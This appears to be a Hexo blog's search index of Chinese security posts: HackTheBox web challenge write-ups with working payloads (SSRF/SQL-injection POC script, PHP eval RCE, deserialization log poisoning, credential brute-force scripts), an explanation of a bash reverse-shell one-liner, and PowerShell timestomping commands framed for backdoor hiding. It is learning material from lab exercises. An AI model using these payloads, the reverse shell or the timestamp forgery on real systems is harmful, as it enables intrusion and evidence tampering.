<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>HackTheBox Diogenes&#39; Rage WriteUP</title>
      <link href="/2023/08/23/HackTheBox-Diogenes-Rage-WriteUP/"/>
      <url>/2023/08/23/HackTheBox-Diogenes-Rage-WriteUP/</url>
      
        <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><blockquote><p>Having missed the flight as you walk down the street, a wild vending machine appears in your way. You check your pocket and there it is, yet another half torn voucher coupon to feed to the consumerism. You start wondering why should you buy things that you don’t like with the money you don’t have for the people you don’t like. You’re Jack’s raging bile duct.</p></blockquote><p><img src="/image.png" alt="challenge"></p><blockquote><p><del>你是杰克汹涌的胆汁导管</del></p></blockquote><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>一开始看了组件以为是个JWT的漏洞，绞尽脑汁没有找到思路之后发现……</p><p>是个条件竞争。</p><p>淦。</p><p>存在漏洞的代码如下：</p><ul><li>database.js</li></ul><p><img src="/image-1.png" alt="vuln"></p><h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p>首先调用<code>/api/purchase</code>获取cookie</p><p><img src="/image-2.png" alt="cookie"></p><p>开足线程跑就完了</p><p><img src="/image-3.png" alt="run！！"></p><p>拿到Flag</p><p><img src="/image-4.png" alt="Flag"></p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p><del>万万没想到有一天会因为网速拿不到flag</del><br>条件竞争我怕不是跑了一百次……</p><blockquote><p>总之这是一个从头到尾充满槽点�</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> HackTheBox </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HackTheBox petpet rcbee WriteUP</title>
      <link href="/2023/08/23/HackTheBox-petpet-rcbee-WriteUP/"/>
      <url>/2023/08/23/HackTheBox-petpet-rcbee-WriteUP/</url>
      
        <content type="html"><![CDATA[<h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><blockquote><p>Bees are comfy 🍯<br>bees are great 🌟🌟🌟<br>this is a petpet generator 👋<br>let’s join forces and save the bees today! 🐝</p></blockquote><p><img src="/2023/08/23/HackTheBox-petpet-rcbee-WriteUP/image.png" alt="Bee"></p><p><img src="/2023/08/23/HackTheBox-petpet-rcbee-WriteUP/image-1.png" alt="Web"></p><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p><code>flag</code>文件的位置已经给出了，那么目标很明确，就是想办法读取到这个文件的内容。</p><p>代码中只有一个上传功能，python的站点通过上传木马GetShell显然是比较罕见的操作，那么更有可能的解题思路是对组件的漏洞进行利用。</p><p><img src="/2023/08/23/HackTheBox-petpet-rcbee-WriteUP/image-2.png" alt="routers.py"></p><p><code>DockerFile</code>中写入了安装<code>Pillow+ghostscript</code>的命令：</p><p><img src="/2023/08/23/HackTheBox-petpet-rcbee-WriteUP/image-3.png" alt="dockerfile"></p><p>关于这两个组件的介绍，我们可以问一下神奇的ChatGPT：</p><p><img src="/2023/08/23/HackTheBox-petpet-rcbee-WriteUP/image-4.png" alt="ChatGPT"></p><p><code>ghostscript-9.23</code>存在远程命令执行漏洞，漏洞详情参考：<a href="https://github.com/farisv/PIL-RCE-Ghostscript-CVE-2018-16509">Python PIL&#x2F;Pillow Remote Shell Command Execution via Ghostscript CVE-2018-16509</a></p><p>对代码进行分析后可以发现，当前的上传功能完美符合漏洞的利用条件。那么接下来，只需要找到<code>flag</code>文件的绝对路径就可以了。这很好找：</p><p><img src="/2023/08/23/HackTheBox-petpet-rcbee-WriteUP/image-5.png" alt="flag_path"></p><p>路径是<code>/app/flag</code></p><h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p>读取<code>/app/flag</code>内容并写入到可访问的静态路径下。</p><p><img src="/2023/08/23/HackTheBox-petpet-rcbee-WriteUP/image-6.png" alt="poc"></p><p>然后直接访问写入的文件即可。</p><p><img src="/2023/08/23/HackTheBox-petpet-rcbee-WriteUP/image-7.png" alt="flag"></p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p><del>开始的时候找错了绝对路径，还以为思路错了。</del></p>]]></content>
      
      
      
        <tags>
            
            <tag> HackTheBox </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HackTheBox Toxic WriteUP</title>
      <link href="/2023/08/23/HackTheBox-Toxic-WriteUP/"/>
      <url>/2023/08/23/HackTheBox-Toxic-WriteUP/</url>
      
        <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><blockquote><p>Humanity has exploited our allies, the dart frogs, for far too long, take back the freedom of our lovely poisonous friends. Malicious input is out of the question when dart frogs meet industrialisation. 🐸</p></blockquote><p><img src="/2023/08/23/HackTheBox-Toxic-WriteUP/image.png" alt="Toxic"></p><p><img src="/2023/08/23/HackTheBox-Toxic-WriteUP/image-1.png" alt="Web"></p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>源代码很简单，只有两个PHP文件</p><pre><code class="php">//index.php&lt;?phpspl_autoload_register(function ($name)&#123;    if (preg_match(&#39;/Model$/&#39;, $name))    &#123;        $name = &quot;models/$&#123;name&#125;&quot;;    &#125;    include_once &quot;$&#123;name&#125;.php&quot;;&#125;);if (empty($_COOKIE[&#39;PHPSESSID&#39;]))&#123;    $page = new PageModel;    $page-&gt;file = &#39;/www/index.html&#39;;    setcookie(        &#39;PHPSESSID&#39;,         base64_encode(serialize($page)),         time()+60*60*24,         &#39;/&#39;    );&#125; $cookie = base64_decode($_COOKIE[&#39;PHPSESSID&#39;]);unserialize($cookie);</code></pre><pre><code class="php">//PageModel.php&lt;?phpclass PageModel&#123;    public $file;    public function __destruct()     &#123;        include($this-&gt;file);    &#125;&#125;</code></pre><p>很显然，是一个PHP反序列化+文件包含的漏洞利用。</p><p>这里就需要找到一个可包含的日志文件，我们可以在<code>nginx.conf</code>中找到AccessLog文件的位置。</p><p><img src="/2023/08/23/HackTheBox-Toxic-WriteUP/image-2.png" alt="AccessLog"></p><h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p>利用<code>User-Agent</code>写入WebShell：</p><p><img src="/2023/08/23/HackTheBox-Toxic-WriteUP/image-3.png" alt="UA"></p><p>构造包含AccessLog的序列化数据：</p><pre><code class="php">O:9:&quot;PageModel&quot;:1:&#123;s:4:&quot;file&quot;;s:25:&quot;/var/log/nginx/access.log&quot;;&#125;//base64encodeTzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoyNToiL3Zhci9sb2cvbmdpbngvYWNjZXNzLmxvZyI7fQ==</code></pre><p>利用WebShell获得文件名和Flag</p><p><img src="/2023/08/23/HackTheBox-Toxic-WriteUP/image-4.png" alt="FileName"></p><p><img src="/2023/08/23/HackTheBox-Toxic-WriteUP/image-5.png" alt="Flag"></p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>非常简单的一个Challenge，很适合作为学习PHP反序列化的入门练习。</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><blockquote><ul><li><a href="https://xz.aliyun.com/t/12507">php反序列化完整总结</a></li></ul></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> HackTheBox </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HackTheBox WeatherAPP WriteUP</title>
      <link href="/2023/08/22/HackTheBox-WeatherAPP-WriteUP/"/>
      <url>/2023/08/22/HackTheBox-WeatherAPP-WriteUP/</url>
      
        <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><blockquote><p>A pit of eternal darkness, a mindless journey of abeyance, this feels like a never-ending dream. I think I’m hallucinating with the memories of my past life, it’s a reflection of how thought I would have turned out if I had tried enough. A weatherman, I said! Someone my community would look up to, someone who is to be respected. I guess this is my way of telling you that I’ve been waiting for someone to come and save me. This weather application is notorious for trapping the souls of ambitious weathermen like me. Please defeat the evil bruxa that’s operating this website and set me free! 🧙‍♀️</p></blockquote><p><img src="/2023/08/22/HackTheBox-WeatherAPP-WriteUP/image.png" alt="WeatherAPP"></p><p><img src="/2023/08/22/HackTheBox-WeatherAPP-WriteUP/image-1.png" alt="Web"></p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>首先看代码，代码给我们的线索有：</p><ol><li>Flag在<code>/app/flag</code>，需要以admin账户登录系统才能获得；</li></ol><p><img src="/2023/08/22/HackTheBox-WeatherAPP-WriteUP/image-2.png" alt="Flag File"></p><ol start="2"><li>admin账号的密码是16进制32Byte大小的随机字符串，暴力破解不用考虑了；</li></ol><p><img src="/2023/08/22/HackTheBox-WeatherAPP-WriteUP/image-3.png" alt="32Pass"></p><ol start="3"><li>注册账户功能存在SQL注入漏洞；</li></ol><p><img src="/2023/08/22/HackTheBox-WeatherAPP-WriteUP/image-4.png" alt="SQL Injection"></p><ol start="4"><li>注册账户功能限制源IP，仅限本地（127.0.0.1）使用；</li></ol><p><img src="/2023/08/22/HackTheBox-WeatherAPP-WriteUP/image-6.png" alt="Register"></p><ol start="5"><li>API<code>/api/weather</code>存在SSRF漏洞；</li></ol><p><img src="/2023/08/22/HackTheBox-WeatherAPP-WriteUP/image-5.png" alt="SSRF"></p><p>至此，思路基本清晰，即：<strong>利用SSRF漏洞，让服务器提交注册用户请求，覆盖掉admin账号的密码，从而取得Flag。</strong></p><p>唯一一个尚未解决的问题是，<code>/api/weather</code>接口只能提交GET请求，而注册用户是强制读取<code>Request Body</code>中的数据的。</p><p>那么，我们还需要寻找其他线索。</p><p><code>package.json</code>中显示，NodeJS版本为8.12.0</p><p><img src="/2023/08/22/HackTheBox-WeatherAPP-WriteUP/image-7.png" alt="NodeJS"></p><p>当前版本的NodeJS存在HTTP Request拆分漏洞，详见：<a href="https://hackerone.com/reports/409943">Node.js disclosed on HackerOne: Http request splitting</a></p><p>利用此漏洞，我们可以顺利通过服务器提交POST表单了。</p><p>完整思路：</p><ol><li>利用SSRF伪造服务器请求；</li><li>利用NodeJS组件漏洞提交POST表单；</li><li>利用注册功能的SQL注入漏洞覆盖掉admin账户的密码；</li><li>登录admin账户，获得Flag。</li></ol><h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p>利用Python构造并提交POC：</p><pre><code class="python"># poc.pyimport requestspayload = &#39;&#39;&#39;127.0.0.1/ HTTP/1.1Host: http://127.0.0.1POST /register HTTP/1.1Host: http://127.0.0.1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencodedContent-Length: 88Connection: closeusername=admin&amp;password=1234&#39;) ON CONFLICT(username) DO UPDATE SET password = &#39;admin&#39;;--GET / HTTP/1.1Host: http://127.0.0.1test:&#39;&#39;&#39;.replace(&quot;\n&quot;,&quot;\r\n&quot;)payload = payload.replace(&#39;\r\n&#39;, &#39;\u010d\u010a&#39;) \    .replace(&#39;+&#39;, &#39;\u012b&#39;) \    .replace(&#39; &#39;, &#39;\u0120&#39;) \    .replace(&#39;&quot;&#39;, &#39;\u0122&#39;) \    .replace(&quot;&#39;&quot;, &#39;\u0a27&#39;) \    .replace(&#39;[&#39;, &#39;\u015b&#39;) \    .replace(&#39;]&#39;, &#39;\u015d&#39;) \    .replace(&#39;`&#39;, &#39;\u0127&#39;) \    .replace(&#39;&quot;&#39;, &#39;\u0122&#39;) \    .replace(&quot;&#39;&quot;, &#39;\u0a27&#39;) \    .replace(&#39;[&#39;, &#39;\u015b&#39;) \    .replace(&#39;]&#39;, &#39;\u015d&#39;)print(payload)burp0_url = &quot;http://167.172.61.89:32702/api/weather&quot;burp0_headers = &#123;&quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36&quot;, &quot;Accept&quot;: &quot;*/*&quot;, &quot;Accept-Language&quot;: &quot;en-US,en;q=0.5&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Referer&quot;: &quot;http://167.172.61.89:32702/&quot;, &quot;Content-Type&quot;: &quot;application/json&quot;, &quot;Origin&quot;: &quot;http://167.172.61.89:32702&quot;, &quot;DNT&quot;: &quot;1&quot;, &quot;Connection&quot;: &quot;close&quot;, &quot;sec-ch-ua-platform&quot;: &quot;\&quot;Windows\&quot;&quot;, &quot;sec-ch-ua&quot;: &quot;\&quot;Google Chrome\&quot;;v=\&quot;113\&quot;, \&quot;Chromium\&quot;;v=\&quot;113\&quot;, \&quot;Not=A?Brand\&quot;;v=\&quot;24\&quot;&quot;, &quot;sec-ch-ua-mobile&quot;: &quot;?0&quot;&#125;burp0_json=&#123;&quot;city&quot;: &quot;Tokyo&quot;, &quot;country&quot;: &quot;JP&quot;, &quot;endpoint&quot;: payload&#125;resp = requests.post(burp0_url, headers=burp0_headers, json=burp0_json)print(resp.text)</code></pre><p>登录admin，获得flag：</p><p><img src="/2023/08/22/HackTheBox-WeatherAPP-WriteUP/image-8.png" alt="Bingo"></p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>最早解题的时候是没有注意到NodeJS的版本的，一直卡在无法提交POST表单这一步，最后还是看了其他大佬的WriteUP。想了一些很抽象的办法，例如在服务器上设置一个HTML文件，访问到这个文件的时候自动提交Form表单。这个思路能成功的前提是，服务器会解析HTML和JavaScript。抱着试一试的心态尝试了一番，最后理所当然的失败了。这里将用到的HTML代码记录下来，权当消遣与纪念(代码是ChatGPT写的)。</p><pre><code class="HTML">&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;    &lt;title&gt;自动提交表单&lt;/title&gt;    &lt;script type=&quot;text/javascript&quot;&gt;        window.onload = function() &#123;            document.forms[&quot;autoSubmitForm&quot;].submit();        &#125;    &lt;/script&gt;&lt;/head&gt;&lt;body&gt;    &lt;form id=&quot;autoSubmitForm&quot; action=&quot;http://127.0.0.1/register&quot; method=&quot;post&quot;&gt;        &lt;input type=&quot;hidden&quot; name=&quot;username&quot; value=&quot;admin&quot;&gt;        &lt;input type=&quot;hidden&quot; name=&quot;password&quot; value=&quot;admin&quot;&gt;    &lt;/form&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><blockquote><p>PS: 今天七夕，在护网现场爆肝三篇WriteUP，感谢女朋友的鼓舞BUFF加持！</p></blockquote><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li><a href="https://www.anquanke.com/post/id/241429">NodeJS 中 Unicode 字符损坏导致的 HTTP 拆分攻击</a></li><li><a href="https://blog.csdn.net/f_cccc/article/details/1164068">HTB之Weather App</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> HackTheBox </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HackTheBox LoveTok WriteUP</title>
      <link href="/2023/08/22/HackTheBox-LoveTok-WriteUP/"/>
      <url>/2023/08/22/HackTheBox-LoveTok-WriteUP/</url>
      
        <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><blockquote><p>True love is tough, and even harder to find. Once the sun has set, the lights close and the bell has rung… you find yourself licking your wounds and contemplating human existence. You wish to have somebody important in your life to share the experiences that come with it, the good and the bad. This is why we made LoveTok, the brand new service that accurately predicts in the threshold of milliseconds when love will come knockin’ (at your door). Come and check it out, but don’t try to cheat love because love cheats back. 💛</p></blockquote><p><img src="/2023/08/22/HackTheBox-LoveTok-WriteUP/image.png" alt="LoveTok"></p><p><img src="/2023/08/22/HackTheBox-LoveTok-WriteUP/image-1.png" alt="Web"></p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>题目有源码下载，理应是从源码中寻找漏洞了。<br>找来找去，只有<code>challenge/controllers/TimeController.php</code>中存在可控参数<code>$_GET[&#39;format&#39;]</code>：</p><pre><code class="php">&lt;?phpclass TimeController&#123;    public function index($router)    &#123;        $format = isset($_GET[&#39;format&#39;]) ? $_GET[&#39;format&#39;] : &#39;r&#39;;        $time = new TimeModel($format);        return $router-&gt;view(&#39;index&#39;, [&#39;time&#39; =&gt; $time-&gt;getTime()]);    &#125;&#125;</code></pre><p>跟踪定位到<code>TimeModel</code>类，代码如下：</p><pre><code class="php">&lt;?phpclass TimeModel&#123;    public function __construct($format)    &#123;        $this-&gt;format = addslashes($format);        [ $d, $h, $m, $s ] = [ rand(1, 6), rand(1, 23), rand(1, 59), rand(1, 69) ];        $this-&gt;prediction = &quot;+$&#123;d&#125; day +$&#123;h&#125; hour +$&#123;m&#125; minute +$&#123;s&#125; second&quot;;    &#125;    public function getTime()    &#123;        eval(&#39;$time = date(&quot;&#39; . $this-&gt;format . &#39;&quot;, strtotime(&quot;&#39; . $this-&gt;prediction . &#39;&quot;));&#39;);        return isset($time) ? $time : &#39;Something went terribly wrong&#39;;    &#125;&#125;</code></pre><p>很显然，要绕过<code>addslashes()</code>函数，利用<code>getTime()</code>中的<code>eval()</code>来RCE了。</p><h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p>代码在<code>addslashes()</code>后没有对传入的参数做其他处理，不好闭合双引号。</p><p>但是如果使用动态变量的话，就不需要闭合双引号了。</p><blockquote><p>在 PHP 中，{} 用于复杂的变量解析。当字符串中的变量名称与其他字符相邻并可能引起混淆时，可以使用这种语法来明确地表示变量名。而 ${} 是一种特殊的语法，它允许你通过一个字符串来动态地生成变量名。<br>——ChatGPT</p></blockquote><p>Payload如下：</p><pre><code>GET /?format=r$&#123;$&#123;system(ls)&#125;&#125; HTTP/1.1</code></pre><p><img src="/2023/08/22/HackTheBox-LoveTok-WriteUP/image-2.png" alt="ls"></p><p>但是<code>addslashes()</code>会对空格进行处理，我们也并没有在当前目录下找到flag，所以利用HTTP参数传入要执行的命令，是个好主意：</p><pre><code>GET /?format=r$&#123;$&#123;system($_GET[aa])&#125;&#125;&amp;aa=ls%20/ HTTP/1.1</code></pre><p><img src="/2023/08/22/HackTheBox-LoveTok-WriteUP/image-3.png" alt="ls /"></p><p>找到<code>flag</code>:</p><p><img src="/2023/08/22/HackTheBox-LoveTok-WriteUP/image-4.png" alt="flag"></p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><blockquote><p><a href="https://www.jianshu.com/p/7c818ddc5731">PHP复杂变量绕过addslashes()直接拿shell</a></p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> HackTheBox </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HackTheBox PhoneBook WriteUP</title>
      <link href="/2023/08/22/HackTheBox_PhoneBook_WriteUP/"/>
      <url>/2023/08/22/HackTheBox_PhoneBook_WriteUP/</url>
      
        <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p><img src="/2023/08/22/HackTheBox_PhoneBook_WriteUP/image-1.png" alt="Who is lucky enough to be included in the phonebook?"></p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>题目给出的网页是这样</p><p><img src="/2023/08/22/HackTheBox_PhoneBook_WriteUP/image-2.png" alt="index"></p><p>看到HTML中有这样一段代码，还以为这题是个DOM XSS(事实上也确实有XSS)</p><pre><code class="HTML">&lt;script&gt;  const queryString = window.location.search;if (queryString) &#123;  const urlParams = new URLSearchParams(queryString);  const message = urlParams.get(&#39;message&#39;);  if (message) &#123;    document.getElementById(&quot;message&quot;).innerHTML = message;    document.getElementById(&quot;message&quot;).style.visibility = &quot;visible&quot;;    &#125;  &#125;&lt;/script&gt;</code></pre><p>但是XSS是需要人触发的，题目中并没有给出任何BOT的信息。</p><p>所以最终的解法要落在登录功能上。</p><h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p>登录功能可以通过通配符<code>*</code>进入，登录成功之后是一个只有搜索框的页面（这里忘记截图了）。搜索功能可以找到若干账户的信息。</p><p><img src="/2023/08/22/HackTheBox_PhoneBook_WriteUP/image-3.png" alt="搜索"></p><p>题目的提示是：<code>Who is lucky enough to be included in the phonebook?</code>，所以我们应该想办法获取能登录的账号密码。</p><p>登录功能可以识别通配符，所以直接写脚本遍历就好了。</p><blockquote><p>userbrute.py</p></blockquote><pre><code class="python">import requestsurl = &quot;http://157.245.43.189:30403/login&quot;value = &#39;&#39;flag = Truewhile(flag):    flag = False    for i in range(33,126,1):        if(chr(i)==&#39;*&#39;):            continue        uname = value + chr(i) + &#39;*&#39;        data = &#123;&quot;username&quot;: uname, &quot;password&quot;: &quot;*&quot;&#125;        resp = requests.post(url, data=data, allow_redirects=False)        print(uname+&#39;\t&#39;+str(resp.status_code))        if(resp.status_code != 302):            continue        if(resp.headers[&#39;Location&#39;] == &#39;/&#39;):            value = value+chr(i)            print(value)            flag = True            break</code></pre><blockquote><p>passbrute.py</p></blockquote><pre><code class="python">import requestsurl = &quot;http://157.245.43.189:30403/login&quot;value = &#39;&#39;flag = Truewhile(flag):    flag = False    for i in range(33,126,1):        if(chr(i)==&#39;*&#39;):            continue        password = value + chr(i) + &#39;*&#39;        data = &#123;&quot;username&quot;: &quot;REESE&quot;, &quot;password&quot;: password&#125;        resp = requests.post(url, data=data, allow_redirects=False)        # print(password+&#39;\t&#39;+str(resp.status_code))        if(resp.status_code != 302):            continue        if(resp.headers[&#39;Location&#39;] == &#39;/&#39;):            value = value+chr(i)            print(value)            flag = True            break</code></pre><p>取得flag：</p><p><img src="/2023/08/22/HackTheBox_PhoneBook_WriteUP/image-4.png" alt="flag"></p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p><del>真正的解题思路是看了别人的writeup才明白的，通配符这是真没想到……</del></p>]]></content>
      
      
      
        <tags>
            
            <tag> HackTheBox </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于Linux下反弹Shell命令的解释</title>
      <link href="/2021/04/28/%E5%85%B3%E4%BA%8ELinux%E4%B8%8B%E5%8F%8D%E5%BC%B9Shell%E5%91%BD%E4%BB%A4%E7%9A%84%E8%A7%A3%E9%87%8A/"/>
      <url>/2021/04/28/%E5%85%B3%E4%BA%8ELinux%E4%B8%8B%E5%8F%8D%E5%BC%B9Shell%E5%91%BD%E4%BB%A4%E7%9A%84%E8%A7%A3%E9%87%8A/</url>
      
        <content type="html"><![CDATA[<p>Linux下反弹shell最常用的一句命令：</p><pre><code class="shell">bash -c &#39;exec bash -i &amp;&gt;/dev/tcp/192.168.1.1/1337 &lt;&amp;1&#39;</code></pre><p>对这条命令的理解，以我个人经历而言，大概分为几个阶段</p><ol><li>知道怎么用，但是记不住，用的时候就百度；</li><li>大概背过了，也能理解命令某些部分的含义，但仍然不清不楚；</li><li>完全理解了命令的每一部分的含义，可以脱离死记硬背，并写出不同形式的命令；</li></ol><p>说来惭愧，入行多年了，今天才完成第三步，这里仅作一次记录。<br>详细原理三言两语较难说清，这里简单提炼一下主要知识点。</p><hr><p>前置理论：</p><ol><li><strong>Linux下的一切都是文件</strong>；</li><li>Linux中的文件描述符：</li></ol><ul><li>标准输入 - 0 （默认设备键盘）</li><li>标准输出 - 1 （默认设备显示器）</li><li>错误输出 - 2 （默认设备显示器）</li></ul><ol start="3"><li>bash 在执行一条指令的时候，首先会检查命令中存不存在重定向的符号，如果存在那么首先将文件描述符重定向，然后在把重定向去掉，执行指令。</li></ol><hr><p>那么，下面简单拆解一下反弹shell的命令<br><code>bash -c</code>：不解释了；<br><code>bash -i</code>：表示启动一个交互式的Shell；<br><code>&amp;&gt;</code>：表示将所有输出重定向；<br><code>/dev/tcp/ip/port</code>：表示目标的地址*(Linux下一切皆是文件)*；<br><code>&lt;&amp;1</code>：表示将标准输入重定向至标准输出的目标；</p><p>简而言之，<code>&amp;&gt;</code>实现了命令输入在攻击端完成，<code>&lt;&amp;1</code>实现了命令结果输出在攻击端。</p><hr><p>参考资料：</p><ul><li><a href="https://item.jd.com/12443890.html">《鸟哥的Linux私房菜》</a></li><li><a href="https://www.k0rz3n.com/2018/08/05/Linux%E5%8F%8D%E5%BC%B9shell%EF%BC%88%E4%B8%80%EF%BC%89%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E4%B8%8E%E9%87%8D%E5%AE%9A%E5%90%91/">Linux反弹shell（一）文件描述符与重定向</a></li><li><a href="https://www.k0rz3n.com/2018/08/05/Linux%20%E5%8F%8D%E5%BC%B9shell%20%EF%BC%88%E4%BA%8C%EF%BC%89%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E6%9C%AC%E8%B4%A8/">Linux 反弹shell（二）反弹shell的本质</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>利用Powershell修改文件/文件夹时间属性</title>
      <link href="/2021/04/09/%E6%89%B9%E9%87%8F%E4%BF%AE%E6%94%B9%E6%96%87%E4%BB%B6-%E6%96%87%E4%BB%B6%E5%A4%B9%E6%97%B6%E9%97%B4%E5%B1%9E%E6%80%A7/"/>
      <url>/2021/04/09/%E6%89%B9%E9%87%8F%E4%BF%AE%E6%94%B9%E6%96%87%E4%BB%B6-%E6%96%87%E4%BB%B6%E5%A4%B9%E6%97%B6%E9%97%B4%E5%B1%9E%E6%80%A7/</url>
      
        <content type="html"><![CDATA[<h2 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h2><ul><li>后门隐藏</li><li>蜜罐搭建</li><li>钓鱼&#x2F;水坑攻击</li></ul><h2 id="技术细节"><a href="#技术细节" class="headerlink" title="技术细节"></a>技术细节</h2><h3 id="单文件时间属性修改"><a href="#单文件时间属性修改" class="headerlink" title="单文件时间属性修改"></a>单文件时间属性修改</h3><pre><code class="powershell">#最后访问时间$(Get-Item &quot;C:/path/to/yourfile&quot;).LastAccessTime=$(Get-Date &quot;1999/1/1 12:12:12&quot;)#最后保存时间$(Get-Item &quot;C:/path/to/yourfile&quot;).LastWriteTime=$(Get-Date &quot;1999/1/1 12:12:12&quot;)#文件创建时间$(Get-Item &quot;C:/path/to/yourfile&quot;).CreationTime=$(Get-Date &quot;1999/1/1 12:12:12&quot;)</code></pre><h3 id="多文件时间属性批量修改"><a href="#多文件时间属性批量修改" class="headerlink" title="多文件时间属性批量修改"></a>多文件时间属性批量修改</h3><pre><code class="powershell">#当前目录所有文件及文件夹时间属性修改foreach($n in $(Get-ChildItem).Name)&#123;$(Get-Item $n).LastAccessTime=$(Get-Date &quot;1999/1/1 12:12:12&quot;)$(Get-Item $n).LastWriteTime=$(Get-Date &quot;1999/1/1 12:12:12&quot;)$(Get-Item $n).CreationTime=$(Get-Date &quot;1999/1/1 12:12:12&quot;)&#125;#仅修改当前目录文件的时间属性（不包含文件夹）foreach($n in $(Get-ChildItem -File).Name)&#123;$(Get-Item $n).LastAccessTime=$(Get-Date &quot;1999/1/1 12:12:12&quot;)$(Get-Item $n).LastWriteTime=$(Get-Date &quot;1999/1/1 12:12:12&quot;)$(Get-Item $n).CreationTime=$(Get-Date &quot;1999/1/1 12:12:12&quot;)&#125;#仅修改当前目录文件夹的时间属性（不包含文件）foreach($n in $(Get-ChildItem -Directory).Name)&#123;$(Get-Item $n).LastAccessTime=$(Get-Date &quot;1999/1/1 12:12:12&quot;)$(Get-Item $n).LastWriteTime=$(Get-Date &quot;1999/1/1 12:12:12&quot;)$(Get-Item $n).CreationTime=$(Get-Date &quot;1999/1/1 12:12:12&quot;)&#125;#修改当前目录下所有文件及文件夹的时间属性（包括子文件夹）foreach($n in $(Get-ChildItem -Recurse).FullName)&#123;$(Get-Item $n).LastAccessTime=$(Get-Date &quot;1999/1/1 12:12:12&quot;)$(Get-Item $n).LastWriteTime=$(Get-Date &quot;1999/1/1 12:12:12&quot;)$(Get-Item $n).CreationTime=$(Get-Date &quot;1999/1/1 12:12:12&quot;)&#125;#将当前目录下所有文件及文件夹时间属性设置为随机时间#示例时间随机范围为2019/1/2至操作系统当前时间foreach($n in $(Get-ChildItem -Recurse).FullName)&#123;$(Get-Item $n).LastAccessTime=$(Get-Random -Minimum $(Get-Date &quot;2019/1/2&quot;).Ticks -Maximum $(Get-Date).Ticks |Get-Date)$(Get-Item $n).LastWriteTime=$(Get-Random -Minimum $(Get-Date &quot;2019/1/2&quot;).Ticks -Maximum $(Get-Date).Ticks |Get-Date)$(Get-Item $n).CreationTime=$(Get-Random -Minimum $(Get-Date &quot;2019/1/2&quot;).Ticks -Maximum $(Get-Date).Ticks |Get-Date)&#125; </code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> CheckList </tag>
            
            <tag> 欺骗 </tag>
            
            <tag> powershell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一个Get-Title的自我修养</title>
      <link href="/2021/01/26/%E4%B8%80%E4%B8%AAGet-Title%E5%BC%95%E5%87%BA%E7%9A%84%E5%9D%91/"/>
      <url>/2021/01/26/%E4%B8%80%E4%B8%AAGet-Title%E5%BC%95%E5%87%BA%E7%9A%84%E5%9D%91/</url>
      
